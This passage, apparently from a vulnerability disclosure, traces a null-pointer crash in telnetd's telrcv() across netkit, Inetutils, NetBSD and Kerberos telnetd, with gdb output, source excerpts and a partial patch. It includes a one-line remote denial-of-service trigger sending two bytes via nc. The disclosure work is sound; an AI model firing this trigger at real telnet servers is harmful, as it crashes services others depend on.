+Reading symbols from /lib64/libncurses.so.6...
+(No debugging symbols found in /lib64/libncurses.so.6)
+Reading symbols from /lib64/libc.so.6...
+Reading symbols from /lib64/libtinfo.so.6...
+(No debugging symbols found in /lib64/libtinfo.so.6)
+Reading symbols from /lib64/ld-linux-x86-64.so.2...
+[Thread debugging using libthread_db enabled]
+Using host libthread_db library "/lib64/libthread_db.so.1".
+0x00007f1973c68a9e in __GI___libc_read (fd=0, buf=0x55640e1a6ec0 &lt;netibuf&gt;, nbytes=8192) at ../sysdeps/unix/sysv/linux/read.c:26
+26  ../sysdeps/unix/sysv/linux/read.c: No such file or directory.
+(gdb) c
+Continuing.
+
+Program received signal SIGSEGV, Segmentation fault.
+0x000055640e198d37 in telrcv () at /tmp/telnet/netkit-telnet-0.17/telnetd/state.c:211
+211              if (c == EC) ch = *slctab[SLC_EC].sptr;
+(gdb) bt
+#0  0x000055640e198d37 in telrcv () at /tmp/telnet/netkit-telnet-0.17/telnetd/state.c:211
+#1  0x000055640e19d553 in ttloop () at /tmp/telnet/netkit-telnet-0.17/telnetd/utility.c:92
+#2  0x000055640e19bf53 in getterminaltype (name=0x7fffa7941730 "") at /tmp/telnet/netkit-telnet-0.17/telnetd/telnetd.c:484
+#3  0x000055640e19c66f in doit (who=0x7fffa7941880, who_len=16) at /tmp/telnet/netkit-telnet-0.17/telnetd/telnetd.c:722
+#4  0x000055640e19bdb7 in main (argc=0, argv=0x7fffa7941a40, env=0x7fffa7941a48) at /tmp/telnet/netkit-telnet-0.17/telnetd/telnetd.c:402
+(gdb) list
+206 {
+207   cc_t ch;
+208   DIAG(TD_OPTIONS, printoption("td: recv IAC", c));
+209   ptyflush();  /* half-hearted */
+210   init_termbuf();
+211   if (c == EC) ch = *slctab[SLC_EC].sptr;
+212   else ch = *slctab[SLC_EL].sptr;
+213   if (ch != (cc_t)(_POSIX_VDISABLE))
+214       *pfrontp++ = (unsigned char)ch;
+215   break;
+(gdb) p slctab[10].sptr
+$1 = (cc_t *) 0x0
+</code></pre>
+<p>We can recognize the same vulnerable function in <code>netkit-telnet-0.17/telnetd/state.c</code>:</p>
+<div class="colorful" style="background: #f8f8f8"><pre style="line-height: 125%"><span></span> <span style="color: #666666">81</span>   <span style="color: #B00040">void</span> <span style="color: #0000FF">telrcv</span>(<span style="color: #B00040">void</span>) {
+ <span style="color: #666666">82</span>     <span style="color: #008000; font-weight: bold">register</span> <span style="color: #B00040">int</span> c;
+ <span style="color: #666666">83</span>     <span style="color: #008000; font-weight: bold">static</span> <span style="color: #B00040">int</span> state <span style="color: #666666">=</span> TS_DATA;
+ <span style="color: #666666">84</span> 
+ <span style="color: #666666">85</span>     <span style="color: #008000; font-weight: bold">while</span> (ncc <span style="color: #666666">&gt;</span> <span style="color: #666666">0</span>) {
+ <span style="color: #666666">86</span>     <span style="color: #008000; font-weight: bold">if</span> ((<span style="color: #666666">&amp;</span>ptyobuf[BUFSIZ] <span style="color: #666666">-</span> pfrontp) <span style="color: #666666">&lt;</span> <span style="color: #666666">2</span>) <span style="color: #008000; font-weight: bold">break</span>;
+ <span style="color: #666666">87</span>     c <span style="color: #666666">=</span> <span style="color: #666666">*</span>netip<span style="color: #666666">++</span> <span style="color: #666666">&amp;</span> <span style="color: #666666">0377</span>;
+ <span style="color: #666666">88</span>     ncc<span style="color: #666666">--</span>;
+...
+<span style="color: #666666">200</span>           <span style="color: #408080; font-style: italic">/*</span>
+<span style="color: #408080; font-style: italic">201               * Erase Character and</span>
+<span style="color: #408080; font-style: italic">202               * Erase Line</span>
+<span style="color: #408080; font-style: italic">203               */</span>
+<span style="color: #666666">204</span>           <span style="color: #008000; font-weight: bold">case</span> <span style="color: #A0A000">EC</span>:
+<span style="color: #666666">205</span>           <span style="color: #008000; font-weight: bold">case</span> <span style="color: #A0A000">EL</span>:
+<span style="color: #666666">206</span>          {
+<span style="color: #666666">207</span>              cc_t ch;
+<span style="color: #666666">208</span>              DIAG(TD_OPTIONS, printoption(<span style="color: #BA2121">&quot;td: recv IAC&quot;</span>, c));
+<span style="color: #666666">209</span>              ptyflush();    <span style="color: #408080; font-style: italic">/* half-hearted */</span>
+<span style="color: #666666">210</span>              init_termbuf();
+<span style="color: #666666">211</span>              <span style="color: #008000; font-weight: bold">if</span> (c <span style="color: #666666">==</span> EC) ch <span style="color: #666666">=</span> <span style="color: #666666">*</span>slctab[SLC_EC].sptr;   <span style="color: #408080; font-style: italic">// vuln</span>
+<span style="color: #666666">212</span>              <span style="color: #008000; font-weight: bold">else</span> ch <span style="color: #666666">=</span> <span style="color: #666666">*</span>slctab[SLC_EL].sptr;           <span style="color: #408080; font-style: italic">// vuln</span>
+<span style="color: #666666">213</span>              <span style="color: #008000; font-weight: bold">if</span> (ch <span style="color: #666666">!=</span> (cc_t)(_POSIX_VDISABLE))
+<span style="color: #666666">214</span>              <span style="color: #666666">*</span>pfrontp<span style="color: #666666">++</span> <span style="color: #666666">=</span> (<span style="color: #B00040">unsigned</span> <span style="color: #B00040">char</span>)ch;
+<span style="color: #666666">215</span>              <span style="color: #008000; font-weight: bold">break</span>;
+<span style="color: #666666">216</span>          }
+<span style="color: #666666">217</span>           
+</pre></div>
+
+<p><a id="remote-dos-inetutils"></a></p>
+<h3>Inetutils</h3>
+<p>Inetutils can be found here:
+<a href="https://git.savannah.gnu.org/cgit/inetutils.git/snapshot/inetutils-2.3.tar.gz">https://git.savannah.gnu.org/cgit/inetutils.git/snapshot/inetutils-2.3.tar.gz</a>.</p>
+<p>Again, we can recognize the similar vulnerable code in <code>inetutils-2.3/telnetd/state.c</code>:</p>
+<div class="colorful" style="background: #f8f8f8"><pre style="line-height: 125%"><span></span><span style="color: #666666">190</span> <span style="color: #B00040">void</span>
+<span style="color: #666666">191</span> <span style="color: #0000FF">telrcv</span> (<span style="color: #B00040">void</span>)
+<span style="color: #666666">192</span> {
+<span style="color: #666666">193</span>   <span style="color: #008000; font-weight: bold">register</span> <span style="color: #B00040">int</span> c;
+<span style="color: #666666">194</span>   <span style="color: #008000; font-weight: bold">static</span> <span style="color: #B00040">int</span> state <span style="color: #666666">=</span> TS_DATA;
+<span style="color: #666666">195</span> 
+<span style="color: #666666">196</span>   <span style="color: #008000; font-weight: bold">while</span> ((net_input_level () <span style="color: #666666">&gt;</span> <span style="color: #666666">0</span>) <span style="color: #666666">&amp;</span> <span style="color: #666666">!</span>pty_buffer_is_full ())
+<span style="color: #666666">197</span>     {
+<span style="color: #666666">198</span>       c <span style="color: #666666">=</span> net_get_char (<span style="color: #666666">0</span>);
+...
+<span style="color: #666666">203</span>       <span style="color: #008000; font-weight: bold">switch</span> (state)
+<span style="color: #666666">204</span>         {
+...
+<span style="color: #666666">213</span>         <span style="color: #008000; font-weight: bold">case</span> <span style="color: #A0A000">TS_DATA</span>:
+<span style="color: #666666">214</span>           <span style="color: #008000; font-weight: bold">if</span> (c <span style="color: #666666">==</span> IAC)
+<span style="color: #666666">215</span>             {
+<span style="color: #666666">216</span>               state <span style="color: #666666">=</span> TS_IAC;
+<span style="color: #666666">217</span>               <span style="color: #008000; font-weight: bold">break</span>;
+<span style="color: #666666">218</span>             }
+...
+<span style="color: #666666">260</span>         <span style="color: #008000; font-weight: bold">case</span> <span style="color: #A0A000">TS_IAC</span>:
+<span style="color: #666666">261</span>         <span style="color: #A0A000">gotiac</span>:
+<span style="color: #666666">262</span>           <span style="color: #008000; font-weight: bold">switch</span> (c)
+<span style="color: #666666">263</span>             {
+...
+<span style="color: #666666">308</span>               <span style="color: #408080; font-style: italic">/*</span>
+<span style="color: #408080; font-style: italic">309                * Erase Character and</span>
+<span style="color: #408080; font-style: italic">310                * Erase Line</span>
+<span style="color: #408080; font-style: italic">311                */</span>
+<span style="color: #666666">312</span>             <span style="color: #008000; font-weight: bold">case</span> <span style="color: #A0A000">EC</span>:
+<span style="color: #666666">313</span>             <span style="color: #008000; font-weight: bold">case</span> <span style="color: #A0A000">EL</span>:
+<span style="color: #666666">314</span>               {
+<span style="color: #666666">315</span>                 cc_t ch;
+<span style="color: #666666">316</span> 
+<span style="color: #666666">317</span>                 DEBUG (debug_options, <span style="color: #666666">1</span>, printoption (<span style="color: #BA2121">&quot;td: recv IAC&quot;</span>, c));
+<span style="color: #666666">318</span>                 ptyflush ();    <span style="color: #408080; font-style: italic">/* half-hearted */</span>
+<span style="color: #666666">319</span>                 init_termbuf ();
+<span style="color: #666666">320</span>                 <span style="color: #008000; font-weight: bold">if</span> (c <span style="color: #666666">==</span> EC)
+<span style="color: #666666">321</span>                   ch <span style="color: #666666">=</span> <span style="color: #666666">*</span>slctab[SLC_EC].sptr;
+<span style="color: #666666">322</span>                 <span style="color: #008000; font-weight: bold">else</span>
+<span style="color: #666666">323</span>                   ch <span style="color: #666666">=</span> <span style="color: #666666">*</span>slctab[SLC_EL].sptr;
+<span style="color: #666666">324</span>                 <span style="color: #008000; font-weight: bold">if</span> (ch <span style="color: #666666">!=</span> (cc_t) (_POSIX_VDISABLE))
+<span style="color: #666666">325</span>                   pty_output_byte ((<span style="color: #B00040">unsigned</span> <span style="color: #B00040">char</span>) ch);
+<span style="color: #666666">326</span>                 <span style="color: #008000; font-weight: bold">break</span>;
+<span style="color: #666666">327</span>               }
+...
+</pre></div>
+
+<p>We tested Inetutils under Debian and found it also vulnerable. Using the <code>inetutils-telnetd</code> package in Debian 10.4.0, telnetd will segfault when receiving <code>\xff\xf7</code> or <code>\xff\xf8</code>:</p>
+<p>Under AMD64:</p>
+<pre><code># uname -ap
+Linux debian 5.10.0-16-amd64 #1 SMP Debian 5.10.127-1 (2022-06-30) x86_64 GNU/Linux
+# dmesg | grep telnetd
+[ 1217.948086] telnetd[17254]: segfault at 0 ip 0000561ae3f92311 sp 00007ffdfb57b650 error 4 in telnetd[561ae3f8b000+15000]
+</code></pre>
+<p>Under i386:</p>
+<pre><code># uname -ap
+Linux debian 5.10.0-16-686 #1 SMP Debian 5.10.127-1 (2022-06-30) i686 GNU/Linux
+# dmesg | grep telnetd
+[ 1432.883806] telnetd[16847]: segfault at 0 ip 004fa8e4 sp bfbb8290 error 4 in telnetd[4f3000+15000]
+</code></pre>
+<p><a id="remote-dos-netbsd-telnetd"></a></p>
+<h3>NetBSD-telnetd</h3>
+<p>We tested the telnetd server in NetBSD and found it also vulnerable. The code is available at <a href="http://ftp.netbsd.org/pub/NetBSD/NetBSD-current/src/libexec/telnetd/state.c">http://ftp.netbsd.org/pub/NetBSD/NetBSD-current/src/libexec/telnetd/state.c</a>:</p>
+<div class="colorful" style="background: #f8f8f8"><pre style="line-height: 125%"><span></span> <span style="color: #666666">85</span> <span style="color: #B00040">void</span>
+ <span style="color: #666666">86</span> <span style="color: #0000FF">telrcv</span>(<span style="color: #B00040">void</span>)
+ <span style="color: #666666">87</span> {
+ <span style="color: #666666">88</span>         <span style="color: #B00040">int</span> c;
+ <span style="color: #666666">89</span>         <span style="color: #008000; font-weight: bold">static</span> <span style="color: #B00040">int</span> state <span style="color: #666666">=</span> TS_DATA;
+ <span style="color: #666666">90</span> 
+ <span style="color: #666666">91</span>         <span style="color: #008000; font-weight: bold">while</span> (ncc <span style="color: #666666">&gt;</span> <span style="color: #666666">0</span>) {
+ <span style="color: #666666">92</span>                 <span style="color: #008000; font-weight: bold">if</span> ((<span style="color: #666666">&amp;</span>ptyobuf[BUFSIZ] <span style="color: #666666">-</span> pfrontp) <span style="color: #666666">&lt;</span> <span style="color: #666666">2</span>)
+ <span style="color: #666666">93</span>                         <span style="color: #008000; font-weight: bold">break</span>;
+ <span style="color: #666666">94</span>                 c <span style="color: #666666">=</span> <span style="color: #666666">*</span>netip<span style="color: #666666">++</span> <span style="color: #666666">&amp;</span> <span style="color: #666666">0377</span>, ncc<span style="color: #666666">--</span>;
+...
+<span style="color: #666666">109</span>                 <span style="color: #008000; font-weight: bold">case</span> <span style="color: #A0A000">TS_DATA</span>:
+<span style="color: #666666">110</span>                         <span style="color: #008000; font-weight: bold">if</span> (c <span style="color: #666666">==</span> IAC) {
+<span style="color: #666666">111</span>                                 state <span style="color: #666666">=</span> TS_IAC;
+<span style="color: #666666">112</span>                                 <span style="color: #008000; font-weight: bold">break</span>;
+<span style="color: #666666">113</span>                         }
+...
+<span style="color: #666666">153</span>                 <span style="color: #008000; font-weight: bold">case</span> <span style="color: #A0A000">TS_IAC</span>:
+<span style="color: #666666">154</span> <span style="color: #A0A000">gotiac</span>:                 <span style="color: #008000; font-weight: bold">switch</span> (c) {
+...
+<span style="color: #666666">206</span>                         <span style="color: #408080; font-style: italic">/*</span>
+<span style="color: #408080; font-style: italic">207                          * Erase Character and</span>
+<span style="color: #408080; font-style: italic">208                          * Erase Line</span>
+<span style="color: #408080; font-style: italic">209                          */</span>
+<span style="color: #666666">210</span>                         <span style="color: #008000; font-weight: bold">case</span> <span style="color: #A0A000">EC</span>:
+<span style="color: #666666">211</span>                         <span style="color: #008000; font-weight: bold">case</span> <span style="color: #A0A000">EL</span>:
+<span style="color: #666666">212</span>                             {
+<span style="color: #666666">213</span>                                 cc_t ch;
+<span style="color: #666666">214</span> 
+<span style="color: #666666">215</span>                                 DIAG(TD_OPTIONS,
+<span style="color: #666666">216</span>                                         printoption(<span style="color: #BA2121">&quot;td: recv IAC&quot;</span>, c));
+<span style="color: #666666">217</span>                                 ptyflush();     <span style="color: #408080; font-style: italic">/* half-hearted */</span>
+<span style="color: #666666">218</span>                                 init_termbuf();
+<span style="color: #666666">219</span>                                 <span style="color: #008000; font-weight: bold">if</span> (c <span style="color: #666666">==</span> EC)
+<span style="color: #666666">220</span>                                         ch <span style="color: #666666">=</span> <span style="color: #666666">*</span>slctab[SLC_EC].sptr; <span style="color: #408080; font-style: italic">// vuln</span>
+<span style="color: #666666">221</span>                                 <span style="color: #008000; font-weight: bold">else</span>
+<span style="color: #666666">222</span>                                         ch <span style="color: #666666">=</span> <span style="color: #666666">*</span>slctab[SLC_EL].sptr; <span style="color: #408080; font-style: italic">// vuln</span>
+<span style="color: #666666">223</span>                                 <span style="color: #008000; font-weight: bold">if</span> (ch <span style="color: #666666">!=</span> (cc_t)(_POSIX_VDISABLE))
+<span style="color: #666666">224</span>                                         <span style="color: #666666">*</span>pfrontp<span style="color: #666666">++</span> <span style="color: #666666">=</span> (<span style="color: #B00040">unsigned</span> <span style="color: #B00040">char</span>)ch;
+<span style="color: #666666">225</span>                                 <span style="color: #008000; font-weight: bold">break</span>;
+<span style="color: #666666">226</span>                             }
+</pre></div>
+
+<p>While testing NetBSD 9.3/amd64, telnetd will segfault, as usual in the <code>telrcv</code> function:</p>
+<pre><code># uname -ap
+NetBSD netbsd 9.3 NetBSD 9.3 (GENERIC) #0: Thu Aug  4 15:30:37 UTC 2022  mkrepro@mkrepro.NetBSD.org:/usr/src/sys/arch/amd64/compile/GENERIC amd64 x86_64
+# ps -auxww|grep telnet
+root    882  0.0  0.0 50312  4068 ?     S     4:15PM 0:00.02 telnetd -a valid
+root    755  0.0  0.0 21652  1324 pts/1 O+    4:15PM 0:00.00 grep telnet
+# gdb -p 882
+GNU gdb (GDB) 8.3
+Copyright (C) 2019 Free Software Foundation, Inc.
+License GPLv3+: GNU GPL version 3 or later &lt;http://gnu.org/licenses/gpl.html&gt;
+...
+[Switching to LWP 1 of process 882]
+0x0000768c9d242c6a in read () from /usr/lib/libc.so.12
+(gdb) c
+Continuing.
+
+Program received signal SIGSEGV, Segmentation fault.
+0x000000012fe06f4c in telrcv ()
+(gdb) q
+A debugging session is active.
+
+        Inferior 1 [process 882] will be detached.
+
+Quit anyway? (y or n) y
+Detaching from program: /usr/libexec/telnetd, process 882
+[Inferior 1 (process 882) detached]
+</code></pre>
+<p><a id="remote-dos-kerberos-telnetd-latest-version"></a></p>
+<h3>Telnetd in Kerberos Version 5 Applications - latest version</h3>
+<p>Using the master branch of <a href="https://github.com/krb5/krb5-appl">https://github.com/krb5/krb5-appl</a>, with a 13-year old <code>state.c</code> file, we can confirm the vulnerabilities are also present:</p>
+<pre><code>Program received signal SIGSEGV, Segmentation fault.
+0x000055555555c1bd in telrcv () at state.c:237
+237      ch = *slctab[SLC_EC].sptr;
+(gdb) bt
+#0  0x000055555555c1bd in telrcv () at state.c:237
+#1  0x000055555555d54d in ttsuck () at utility.c:153
+#2  0x0000555555559fc3 in getterminaltype (name=0x7fffffffdc80 "") at telnetd.c:727
+#3  doit (who=who@entry=0x7fffffffe2e0) at telnetd.c:1025
+#4  0x0000555555558e82 in main (argc=&lt;optimized out&gt;, argv=&lt;optimized out&gt;) at telnetd.c:644
+</code></pre>
+<p>The vulnerable part in <code>state.c</code> has not been changed since the initial commit but we would like to confirm that the vulnerabilities existed for 30 years.</p>
+<p>In the next section, we will analyze the initial commit:</p>
+<p><a id="remote-dos-kerberos-telnetd-initial-version"></a></p>
+<h3>Telnetd in Kerberos Version 5 Applications - initial version</h3>
+<p>The code of Telnetd in Kerberos Version 5 Applications is vulnerable in the initial version. The first commit from 1991 was vulnerable as shown below.</p>
+<p>This is likely the source of these 2 vulnerabilities that have been then copied into several forks over the years.</p>
+<p><a href="https://github.com/krb5/krb5-appl/blob/f8420ba3e60160da670f4f9a5b9f5429f67cd174/telnet/telnetd/state.c#L218">https://github.com/krb5/krb5-appl/blob/f8420ba3e60160da670f4f9a5b9f5429f67cd174/telnet/telnetd/state.c#L218</a>:</p>
+<div class="colorful" style="background: #f8f8f8"><pre style="line-height: 125%"><span></span> <span style="color: #666666">79</span>         <span style="color: #B00040">void</span>
+ <span style="color: #666666">80</span> <span style="color: #0000FF">telrcv</span>()
+ <span style="color: #666666">81</span> {
+ <span style="color: #666666">82</span>         <span style="color: #008000; font-weight: bold">register</span> <span style="color: #B00040">int</span> c;
+ <span style="color: #666666">83</span>         <span style="color: #008000; font-weight: bold">static</span> <span style="color: #B00040">int</span> state <span style="color: #666666">=</span> TS_DATA;
+ <span style="color: #666666">84</span> <span style="border: 1px solid #FF0000">#</span><span style="color: #008000; font-weight: bold">if</span>     defined(CRAY2) <span style="color: #666666">&amp;&amp;</span> defined(UNICOS5)
+ <span style="color: #666666">85</span>         <span style="color: #B00040">char</span> <span style="color: #666666">*</span>opfrontp <span style="color: #666666">=</span> pfrontp;
+ <span style="color: #666666">86</span> <span style="border: 1px solid #FF0000">#</span>endif
+ <span style="color: #666666">87</span> 
+ <span style="color: #666666">88</span>         <span style="color: #008000; font-weight: bold">while</span> (ncc <span style="color: #666666">&gt;</span> <span style="color: #666666">0</span>) {
+ <span style="color: #666666">89</span>                 <span style="color: #008000; font-weight: bold">if</span> ((<span style="color: #666666">&amp;</span>ptyobuf[BUFSIZ] <span style="color: #666666">-</span> pfrontp) <span style="color: #666666">&lt;</span> <span style="color: #666666">2</span>)
+ <span style="color: #666666">90</span>                         <span style="color: #008000; font-weight: bold">break</span>;
+ <span style="color: #666666">91</span>                 c <span style="color: #666666">=</span> <span style="color: #666666">*</span>netip<span style="color: #666666">++</span> <span style="color: #666666">&amp;</span> <span style="color: #666666">0377</span>, ncc<span style="color: #666666">--</span>;
+...
+ <span style="color: #666666">96</span>                 <span style="color: #008000; font-weight: bold">switch</span> (state) {
+...
+<span style="color: #666666">106</span>                 <span style="color: #008000; font-weight: bold">case</span> <span style="color: #A0A000">TS_DATA</span>:
+<span style="color: #666666">107</span>                         <span style="color: #008000; font-weight: bold">if</span> (c <span style="color: #666666">==</span> IAC) {
+<span style="color: #666666">108</span>                                 state <span style="color: #666666">=</span> TS_IAC;
+<span style="color: #666666">109</span>                                 <span style="color: #008000; font-weight: bold">break</span>;
+<span style="color: #666666">110</span>                         }
+...
+<span style="color: #666666">150</span>                 <span style="color: #008000; font-weight: bold">case</span> <span style="color: #A0A000">TS_IAC</span>:
+<span style="color: #666666">151</span> <span style="color: #A0A000">gotiac</span>:                 <span style="color: #008000; font-weight: bold">switch</span> (c) {
+...
+<span style="color: #666666">204</span>                         <span style="color: #408080; font-style: italic">/*</span>
+<span style="color: #408080; font-style: italic">205                          * Erase Character and</span>
+<span style="color: #408080; font-style: italic">206                          * Erase Line</span>
+<span style="color: #408080; font-style: italic">207                          */</span>
+<span style="color: #666666">208</span>                         <span style="color: #008000; font-weight: bold">case</span> <span style="color: #A0A000">EC</span>:
+<span style="color: #666666">209</span>                         <span style="color: #008000; font-weight: bold">case</span> <span style="color: #A0A000">EL</span>:
+<span style="color: #666666">210</span>                             {
+<span style="color: #666666">211</span>                                 cc_t ch;
+<span style="color: #666666">212</span> 
+<span style="color: #666666">213</span>                                 DIAG(TD_OPTIONS,
+<span style="color: #666666">214</span>                                         printoption(<span style="color: #BA2121">&quot;td: recv IAC&quot;</span>, c));
+<span style="color: #666666">215</span>                                 ptyflush();     <span style="color: #408080; font-style: italic">/* half-hearted */</span>
+<span style="color: #666666">216</span>                                 init_termbuf();
+<span style="color: #666666">217</span>                                 <span style="color: #008000; font-weight: bold">if</span> (c <span style="color: #666666">==</span> EC)
+<span style="color: #666666">218</span>                                         ch <span style="color: #666666">=</span> <span style="color: #666666">*</span>slctab[SLC_EC].sptr; <span style="color: #408080; font-style: italic">// vuln</span>
+<span style="color: #666666">219</span>                                 <span style="color: #008000; font-weight: bold">else</span>
+<span style="color: #666666">220</span>                                         ch <span style="color: #666666">=</span> <span style="color: #666666">*</span>slctab[SLC_EL].sptr; <span style="color: #408080; font-style: italic">// vuln</span>
+<span style="color: #666666">221</span>                                 <span style="color: #008000; font-weight: bold">if</span> (ch <span style="color: #666666">!=</span> (cc_t)(_POSIX_VDISABLE))
+<span style="color: #666666">222</span>                                         <span style="color: #666666">*</span>pfrontp<span style="color: #666666">++</span> <span style="color: #666666">=</span> (<span style="color: #B00040">unsigned</span> <span style="color: #B00040">char</span>)ch;
+<span style="color: #666666">223</span>                                 <span style="color: #008000; font-weight: bold">break</span>;
+<span style="color: #666666">224</span>                             }
+</pre></div>
+
+<p>From the <code>README</code> file available at
+<a href="https://github.com/krb5/krb5-appl/blob/f8420ba3e60160da670f4f9a5b9f5429f67cd174/telnet/README">https://github.com/krb5/krb5-appl/blob/f8420ba3e60160da670f4f9a5b9f5429f67cd174/telnet/README</a>, this solution is not really recent.</p>
+<p>The date included in the <code>README</code> file is February 22, 1991 but the <code>krb5-appl/telnet/telnetd/state.c</code> file indicates <code>@(#)state.c     5.12 (Berkeley) 1/19/93</code>.</p>
+<p>The supported Operating Systems listed in the <code>README</code> file are also very old:</p>
+<pre><code>This is a distribution of both client and server telnet.  These programs
+have been compiled on:
+                        telnet  telnetd 
+        BSD 4.3 Reno      X       X
+        UNICOS 5.1        X       X
+        UNICOS 6.0        X       X
+        UNICOS 6.1        X       X
+        UNICOS 7.0        X       X
+        SunOs 3.5         X       X (no linemode in server) 
+        SunOs 4.1         X       X (no linemode in server) 
+        DYNIX V3.0.17.9   X       X (no linemode in server) 
+        Ultrix 3.1        X       X (no linemode in server) 
+        Ultrix 4.0        X       X (no linemode in server)
+
+In addition, previous versions have been compiled on the following
+machines, but were not available for testing this version.
+                        telnet  telnetd 
+        Next1.0           X       X
+        UNICOS 5.0        X       X
+        SunOs 4.0.3c      X       X (no linemode in server) 
+        BSD 4.3           X       X (no linemode in server) 
+        DYNIX V3.0.12     X       X (no linemode in server)
+</code></pre>
+<p>Back to FreeBSD to compile and test this initial version of Telnetd in Kerberos Version 5 Applications.</p>
+<p>On a side note, it was confirmed the <code>telnetd</code> server shipped in FreeBSD 3.2 is vulnerable to the same vulnerabilities, as shown below:</p>
+<pre><code>myname# uname -ap
+FreeBSD myname.my.domain 3.2-RELEASE FreeBSD 3.2-RELEASE #0: Tue May 18 04:05:08 GMT 1999     jkh@cathair:/usr/src/sys/compile/GENERIC  i386
+myname# dmesg | grep telnet
+pid 291 (telnetd), uid 0: exited on signal 11 (core dumped) 
+pid 297 (telnetd), uid 0: exited on signal 11 (core dumped) 
+pid 303 (telnetd), uid 0: exited on signal 11 (core dumped)
+pid 319 (telnetd), uid 0: exited on signal 11 (core dumped)
+</code></pre>
+<p><br>
+We succesfully compiled <a href="https://github.com/krb5/krb5-appl/blob/f8420ba3e60160da670f4f9a5b9f5429f67cd174/telnet/telnetd">https://github.com/krb5/krb5-appl/blob/f8420ba3e60160da670f4f9a5b9f5429f67cd174/telnet/telnetd</a> in FreeBSD 3.2.</p>
+<p>Here is the <code>diff</code> to compile the initial version of the Telnetd in Kerberos Version 5 Applications, from the branch <code>f8420ba3e6</code> (<code>initial version</code>) under FreeBSD 3.2 (the preprocessor variables <code>-DAUTHENTICATION</code> and <code>-DENCRYPTION</code> have been removed but the vulnerable code path is still reachable):</p>
+<pre><code>myname# diff -r krb5-appl krb5-appl.patched
+diff -r krb5-appl/telnet/telnetd/Makefile.4.4 krb5-appl.patched/telnet/telnetd/Makefile.4.4
+24c24
+&lt; CFLAGS+=-DAUTHENTICATION -DENCRYPTION -I${.CURDIR}/../../lib
+---
+&gt; CFLAGS+=-I${.CURDIR}/../../lib
+diff -r krb5-appl/telnet/telnetd/telnetd.c krb5-appl.patched/telnet/telnetd/telnetd.c
+1005c1005
+&lt;           char *getstr();
+---
+&gt;           char *Getstr();
+1008,1010c1008,1010
+&lt;           HE = getstr("he", &amp;cp);
+&lt;           HN = getstr("hn", &amp;cp);
+&lt;           IM = getstr("im", &amp;cp);
+---
+&gt;           HE = Getstr("he", &amp;cp);
+&gt;           HN = Getstr("hn", &amp;cp);
+&gt;           IM = Getstr("im", &amp;cp);
+diff -r krb5-appl/telnet/telnetd/telnetd.h krb5-appl.patched/telnet/telnetd/telnetd.h
+49a50,52
+&gt; #define TELOPT_ENVIRON 36
+&gt; #define ENV_VALUE 0
+&gt; #define ENV_VAR 1
+myname#
+</code></pre>
+<p>Compiling and installing this telnetd program:</p>
+<pre><code>myname# make -f Makefile.4.4
+Warning: Object directory not changed from original /usr/home/test/krb5-appl.patched/telnet/telnetd
+cc -O -pipe -DLINEMODE -DKLUDGELINEMODE -DUSE_TERMIO -DDIAGNOSTICS -I/usr/home/test/krb5-appl.patched/telnet/telnetd/../../lib   -c authenc.c
+cc -O -pipe -DLINEMODE -DKLUDGELINEMODE -DUSE_TERMIO -DDIAGNOSTICS -I/usr/home/test/krb5-appl.patched/telnet/telnetd/../../lib   -c global.c
+cc -O -pipe -DLINEMODE -DKLUDGELINEMODE -DUSE_TERMIO -DDIAGNOSTICS -I/usr/home/test/krb5-appl.patched/telnet/telnetd/../../lib   -c slc.c
+cc -O -pipe -DLINEMODE -DKLUDGELINEMODE -DUSE_TERMIO -DDIAGNOSTICS -I/usr/home/test/krb5-appl.patched/telnet/telnetd/../../lib   -c state.c
+cc -O -pipe -DLINEMODE -DKLUDGELINEMODE -DUSE_TERMIO -DDIAGNOSTICS -I/usr/home/test/krb5-appl.patched/telnet/telnetd/../../lib   -c sys_term.c
+cc -O -pipe -DLINEMODE -DKLUDGELINEMODE -DUSE_TERMIO -DDIAGNOSTICS -I/usr/home/test/krb5-appl.patched/telnet/telnetd/../../lib   -c telnetd.c
+cc -O -pipe -DLINEMODE -DKLUDGELINEMODE -DUSE_TERMIO -DDIAGNOSTICS -I/usr/home/test/krb5-appl.patched/telnet/telnetd/../../lib   -c termstat.c
+cc -O -pipe -DLINEMODE -DKLUDGELINEMODE -DUSE_TERMIO -DDIAGNOSTICS -I/usr/home/test/krb5-appl.patched/telnet/telnetd/../../lib   -c utility.c
+cc -O -pipe -DLINEMODE -DKLUDGELINEMODE -DUSE_TERMIO -DDIAGNOSTICS -I/usr/home/test/krb5-appl.patched/telnet/telnetd/../../lib    -o telnetd authenc.o global.o slc.o state.o sys_term.o telnetd.o termstat.o utility.o  -lutil -ltermcap -ltelnet -lkrb -ldes
+gzip -cn telnetd.0 &gt; telnetd.0.gz
+myname# cp telnetd /usr/libexec/telnetd &amp;&amp; chmod 555 /usr/libexec/telnetd
+</code></pre>
+<p>And we can confirm this version is vulnerable.</p>
+<pre><code>kali% printf "\xff\xf7" | nc -n -v 192.168.1.201 23
+(UNKNOWN) [192.168.1.201] 23 (telnet) open
+&lt;BF&gt;&lt;C3&gt;&lt;BD&gt;&lt;C3&gt;&lt;BF&gt;&lt;C3&gt;&lt;BD&gt;&lt;C3&gt;&lt;BF&gt;&lt;C3&gt;&lt;BD&gt;
+kali%
+</code></pre>
+<p>Using <code>dmesg</code>, we can see the crashes of telnetd on the remote FreeBSD 3.2 server:</p>
+<pre><code>myname# dmesg | grep telnet
+pid 497 (telnetd), uid 0: exited on signal 11 (core dumped)
+pid 499 (telnetd), uid 0: exited on signal 11 (core dumped)
+pid 500 (telnetd), uid 0: exited on signal 11 (core dumped)
+pid 501 (telnetd), uid 0: exited on signal 11 (core dumped)
+pid 502 (telnetd), uid 0: exited on signal 11 (core dumped)
+pid 503 (telnetd), uid 0: exited on signal 11 (core dumped)
+</code></pre>
+<p>We also provide a working patch for Telnetd, Kerberos Version 5 Applications - <code>initial version</code>. This patch has been tested with FreeBSD 3.2/i386.</p>
+<p>Please note that we suggest not to use FreeBSD 3.2 or the 30-year old version of the Kerberos Version 5 Applications.</p>
+<pre><code>myname# diff -u -p krb5-appl/telnet/telnetd/state.c krb5-appl.patched/telnet/telnetd/state.c
+--- krb5-appl/telnet/telnetd/state.c        Sun Aug 21 09:00:34 2022
++++ krb5-appl.patched/telnet/telnetd/state.c        Mon Aug 21 09:02:56 2022
+@@ -208,16 +208,22 @@ gotiac:                       switch (c) {
+                    case EC:
+                    case EL:
+                        {
+-                           cc_t ch;
++                           cc_t ch = (cc_t)_POSIX_VDISABLE;
+
+                            DIAG(TD_OPTIONS,
+                                    printoption("td: recv IAC", c));
+                            ptyflush();     /* half-hearted */
+                            init_termbuf();
+                            if (c == EC)
+-                                   ch = *slctab[SLC_EC].sptr;
++                           {
